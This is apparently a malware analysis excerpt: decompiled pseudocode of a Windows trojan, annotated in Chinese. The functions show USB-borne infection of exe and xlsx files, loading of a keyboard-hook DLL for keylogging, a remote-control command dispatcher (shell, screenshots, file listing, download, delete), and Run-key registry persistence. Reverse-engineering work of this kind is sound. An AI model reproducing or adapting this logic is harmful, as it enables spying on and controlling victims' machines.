int __userpurge injectUsbHandle_49686C@<eax>(int a1@<eax>, int a2@<edx>, int System::AnsiString@<ecx>, int a4@<ebx>, int a5@<edi>, int a6@<esi>, int a7)
{
  int v7; // ebx
  int v8; // esi
  char v9; // zf
  int v10; // ecx
  int v11; // ecx
  int v12; // ecx
  int v13; // edx
  int v14; // ecx
  int v15; // ecx
  unsigned int v17; // [esp-24h] [ebp-40h]
  void *v18; // [esp-20h] [ebp-3Ch]
  int *v19; // [esp-1Ch] [ebp-38h]
  unsigned int v20; // [esp-18h] [ebp-34h]
  void *v21; // [esp-14h] [ebp-30h]
  int *v22; // [esp-10h] [ebp-2Ch]
  int v23; // [esp-Ch] [ebp-28h]
  int v24; // [esp-8h] [ebp-24h]
  int v25; // [esp-4h] [ebp-20h]
  int v26; // [esp+0h] [ebp-1Ch]
  int v27; // [esp+4h] [ebp-18h]
  int v28; // [esp+8h] [ebp-14h]
  int v29; // [esp+Ch] [ebp-10h]
  int v30; // [esp+10h] [ebp-Ch]
  int v31; // [esp+14h] [ebp-8h]
  int v32; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h]

  v32 = 0;
  v31 = 0;
  v30 = 0;
  v29 = 0;
  v28 = 0;
  v27 = 0;
  v26 = 0;
  v25 = a4;
  v24 = a6;
  v23 = a5;
  v7 = System::AnsiString;
  v8 = a1;
  v22 = &savedregs;
  v21 = &loc_4969C5;
  v20 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v20);
  v19 = &savedregs;
  v18 = &loc_4969A0;
  v17 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v17);
  Sysutils::ExtractFileExt(System::AnsiString);
  System::__linkproc__ LStrCmp(v32, &str__exe_0[1]);// 比较后缀名是否是exe
  if ( v9 && !unknown_libname_89(&str____0[1], v7) && (unsigned __int8)Sysutils::StrToBool(dword_49F1D0) )
  {
    System::__linkproc__ LStrCat3(&v31, &str_Injecting____[1], v7);
    sub_4967D4(v8, v31, v10);
    injectByResource_477940(v7, (int)off_49D6B8, (const CHAR *)off_49D6BC, dword_49F14C, 1, (int)&v30);
    sub_4967D4(v8, v30, v11);
  }
  else
  {
    Sysutils::ExtractFileExt(v7);
    System::__linkproc__ LStrCmp(v29, &str__xlsx[1]);// 比较是否是xlsx文件
    if ( v9 )
    {
      Sysutils::ExtractFileName(v7);
      if ( !Sysutils::AnsiPos(&str___[1], v28) )
      {
        if ( (unsigned __int8)Sysutils::StrToBool(dword_49F1D4) )
        {
          System::__linkproc__ LStrCat3(&v27, &str_Injecting____[1], v7);
          sub_4967D4(v8, v27, v12);
          injectByXlsmResource_47983C(v7, v13, v14);
          System::__linkproc__ LStrCat3(&v26, &str_Completed_____2[1], v7);
          sub_4967D4(v8, v26, v15);
        }
      }
    }
  }
  __writefsdword(0, v17);
  __writefsdword(0, v20);
  v22 = (int *)&loc_4969CC;
  return System::__linkproc__ LStrArrayClr(&v26, 7);
}

// 会从资源中得到HBHKS  dll用于监听键盘
int __fastcall keyboard_4764E4(int a1, int a2, int a3)
{
  int v3; // edi
  int v4; // ebx
  int v5; // esi
  const CHAR *v6; // eax
  const CHAR *v7; // eax
  int v8; // eax
  HANDLE v9; // eax
  int v10; // eax
  _DWORD *v11; // eax
  HANDLE v12; // eax
  int v13; // eax
  _DWORD *v14; // ebx
  unsigned int v16; // [esp-18h] [ebp-1Ch]
  void *v17; // [esp-14h] [ebp-18h]
  int *v18; // [esp-10h] [ebp-14h]
  int v19; // [esp-Ch] [ebp-10h]
  int v20; // [esp-8h] [ebp-Ch]
  int v21; // [esp-4h] [ebp-8h]
  int v22; // [esp+0h] [ebp-4h]
  int savedregs; // [esp+4h] [ebp+0h]

  v22 = 0;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  v18 = &savedregs;
  v17 = &loc_476697;
  v16 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v16);
  if ( (_BYTE)a2 )
  {
    sub_47671C(a2, dword_49EC58, a2, a3, a1);
    v6 = (const CHAR *)System::__linkproc__ LStrToPChar(dword_49EC5C);
    *(_DWORD *)(v5 + 64) = LoadLibraryA(v6);
    if ( !*(_DWORD *)(v5 + 64) )
    {
      System::__linkproc__ LStrCat3(&v22, &str_X[1], dword_49EC58);
      sub_47671C(v4, v22, v4, v3, v5);          // 释放键盘监控的dll
      v7 = (const CHAR *)System::__linkproc__ LStrToPChar(dword_49EC5C);
      *(_DWORD *)(v5 + 64) = LoadLibraryA(v7);  // 加载dll
    }
    *(_DWORD *)(v5 + 68) = GetProcAddress_0(*(HMODULE *)(v5 + 64), "HookOn");
    *(_DWORD *)(v5 + 72) = GetProcAddress_0(*(HMODULE *)(v5 + 64), "HookOff");
    if ( !*(_DWORD *)(v5 + 68) || !*(_DWORD *)(v5 + 72) )
    {
      v8 = unknown_libname_173((int)&cls_SysUtils_Exception, 1, (int)&str_DLL_Fonksiyonu_[1]);
      System::__linkproc__ RaiseExcept(v8);
    }
    v9 = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, 4u, "ElReceptor");
    *(_DWORD *)(v5 + 48) = v9;
    if ( !v9 )
    {
      v10 = unknown_libname_173((int)&cls_SysUtils_Exception, 1, (int)&str_Dosya_Olu_turul[1]);
      System::__linkproc__ RaiseExcept(v10);
    }
    v11 = MapViewOfFile(*(HANDLE *)(v5 + 48), 2u, 0, 0, 0);
    *(_DWORD *)(v5 + 56) = v11;
    *v11 = v3;
    v12 = CreateFileMappingA((HANDLE)0xFFFFFFFF, 0, 4u, 0, 4u, "CBReceptor");
    *(_DWORD *)(v5 + 52) = v12;
    if ( !v12 )
    {
      v13 = unknown_libname_173((int)&cls_SysUtils_Exception, 1, (int)&str_Dosya_Olu_turul[1]);
      System::__linkproc__ RaiseExcept(v13);
    }
    v14 = MapViewOfFile(*(HANDLE *)(v5 + 52), 2u, 0, 0, 0);
    *(_DWORD *)(v5 + 60) = v14;
    *v14 = v3;
    (*(void (__cdecl **)(unsigned int, void *, int *, int, int, int, int))(v5 + 68))(v16, v17, v18, v19, v20, v21, v22);
  }
  else
  {
    if ( *(_DWORD *)(a1 + 72) )
      (*(void (__cdecl **)(unsigned int, void *, int *))(a1 + 72))(v16, v17, v18);
    if ( *(_DWORD *)(v5 + 64) )
      FreeLibrary_0(*(HMODULE *)(v5 + 64));
    if ( *(_DWORD *)(v5 + 48) )
    {
      UnmapViewOfFile(*(LPCVOID *)(v5 + 56));
      UnmapViewOfFile(*(LPCVOID *)(v5 + 60));
      CloseHandle_0(*(HANDLE *)(v5 + 48));
      CloseHandle_0(*(HANDLE *)(v5 + 52));
    }
  }
  __writefsdword(0, v16);
  v18 = (int *)&loc_47669E;
  return System::__linkproc__ LStrClr(&v22);
}

// 远控功能
int __fastcall control_495BD4(int a1)
{
  int v1; // ebx
  int v2; // esi
  char v3; // zf
  unsigned int v4; // edx
  unsigned int v6; // [esp-14h] [ebp-28h]
  int *v7; // [esp-10h] [ebp-24h]
  int *v8; // [esp-Ch] [ebp-20h]
  void *v9; // [esp-8h] [ebp-1Ch]
  int *v10; // [esp-4h] [ebp-18h]
  void *v11; // [esp+0h] [ebp-14h]
  DWORD ThreadId; // [esp+Ch] [ebp-8h]
  int v13; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h]

  v13 = 0;
  v1 = a1;
  v10 = &savedregs;
  v9 = &loc_495D23;
  v8 = (int *)__readfsdword(0);
  __writefsdword(0, (unsigned int)&v8);
  if ( (*(unsigned __int8 (__stdcall **)(int *))(*(_DWORD *)dword_49F114 + 84))(v8) )
  {
    unknown_libname_533(dword_49F134, 0);
    (*(void (__fastcall **)(Idstream::TIdStream *, _strings *))(*(_DWORD *)dword_49F114 + 124))(
      dword_49F114,
      &str_CheckMe[1]);
    v8 = (int *)-1;
    v7 = &v13;
    v2 = *(_DWORD *)dword_49F114;
    (*(void (__fastcall **)(Idstream::TIdStream *, _strings *, signed int, signed int, int *))(*(_DWORD *)dword_49F114
                                                                                             + 112))(
      dword_49F114,
      &str___79[1],
      -1,
      -1,
      &v13);
    v8 = &savedregs;
    v7 = (int *)&loc_495CD3;
    v6 = __readfsdword(0);
    __writefsdword(0, (unsigned int)&v6);
    System::__linkproc__ LStrCmp(v13, &str_GetCMDAccess[1]);// cmd
    if ( v3 )
      sub_495DD0(v1, v2);
    System::__linkproc__ LStrCmp(v13, &str_GetScreenImage[1]);// 截屏
    if ( v3 )
      sub_495F14();
    System::__linkproc__ LStrCmp(v13, &str_ListDisk[1]);// 磁盘目录
    if ( v3 )
      sub_495FDC(v1);
    System::__linkproc__ LStrCmp(v13, &str_ListDir[1]);// 文件目录
    if ( v3 )
      sub_4960C8(v1);
    System::__linkproc__ LStrCmp(v13, &str_DownloadFile[1]);// 下载文件
    if ( v3 )
      sub_496254(v1);
    System::__linkproc__ LStrCmp(v13, &str_DeleteFile[1]);// 删除文件
    if ( v3 )
      sub_496400(v1);
    v4 = v6;
    __writefsdword(0, v6);
    LOBYTE(v4) = 1;
    unknown_libname_533(dword_49F134, v4);
  }
  else
  {
    unknown_libname_533(dword_49F134, 0);
    CreateThread_0(0, 0, (LPTHREAD_START_ROUTINE)StartAddress, 0, 0, &ThreadId);
  }
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_495D2A;
  return System::__linkproc__ LStrClr(&v13);
}

// 持久化攻击，老套路 注册表
int __fastcall runByRegKey_47357C(char a1, int a2, unsigned int a3, char a4)
{
  char v4; // bl
  int v5; // edx
  int v6; // ecx
  unsigned int v8; // [esp-18h] [ebp-28h]
  void *v9; // [esp-14h] [ebp-24h]
  void **v10; // [esp-10h] [ebp-20h]
  unsigned int v11; // [esp-Ch] [ebp-1Ch]
  void *v12; // [esp-8h] [ebp-18h]
  void **v13; // [esp-4h] [ebp-14h]
  System::TObject *v14; // [esp+4h] [ebp-Ch]
  unsigned int v15; // [esp+8h] [ebp-8h]
  int System::AnsiString; // [esp+Ch] [ebp-4h]
  void *savedregs; // [esp+10h] [ebp+0h]

  v15 = a3;
  System::AnsiString = a2;
  v4 = a1;
  System::__linkproc__ LStrAddRef(a2, a2, a3);
  System::__linkproc__ LStrAddRef(v15, v5, v6);
  v13 = &savedregs;
  v12 = &loc_47365D;
  v11 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v11);
  v10 = &savedregs;
  v9 = &loc_47363B;
  v8 = __readfsdword(0);
  __writefsdword(0, (unsigned int)&v8);
  v14 = (System::TObject *)Registry::TRegistry::TRegistry((Registry::TRegistry *)dword_431D40);
  if ( v4 )
    Registry::TRegistry::SetRootKey(v14, 0x80000002);
  else
    Registry::TRegistry::SetRootKey(v14, 0x80000001);
  *((_BYTE *)v14 + 12) = 0;
  Registry::TRegistry::OpenKey(v14, (const int)&str_Software_Micros[1], 0);// Software\Microsoft\Windows\CurrentVersion\Run
  if ( a4 )
    Registry::TRegistry::WriteString(v14, System::AnsiString, v15);
  else
    Registry::TRegistry::DeleteValue(v14, System::AnsiString);
  Registry::TRegistry::CloseKey(v14);
  __writefsdword(0, v8);
  v10 = (void **)&loc_473642;
  System::TObject::Free(v14);
  __writefsdword(0, v15);
  savedregs = &loc_473664;
  return System::__linkproc__ LStrArrayClr(&v15, 2);
}
```

